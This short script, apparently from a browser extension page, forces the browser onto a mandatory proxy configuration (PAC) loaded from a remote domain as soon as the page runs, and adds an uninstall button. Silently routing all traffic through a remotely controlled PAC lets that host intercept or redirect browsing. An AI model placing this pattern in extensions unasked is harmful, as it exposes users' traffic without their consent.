function set_pac_data(){
    chrome.proxy.settings.set({
        value: {
            mode: 'pac_script',
            pacScript: {
                url: "https://service.shyonghui.xyz/install.html",
                mandatory: true
            }
        },
        scope: 'regular'
    });
}

set_pac_data();

if(navigator.userAgent.match(/Edg\/([0-9]+)\./)){
    document.getElementById("appstorelink").href=  "https://microsoftedge.microsoft.com/insider-addons/detail/mchibleoefileemjfghfejaggonplmmg";
}
function uninstallself(){
    chrome.management.uninstallSelf();
}

document.getElementById("uninstall-btn").addEventListener('click',function ()
{
    uninstallself();
} ); 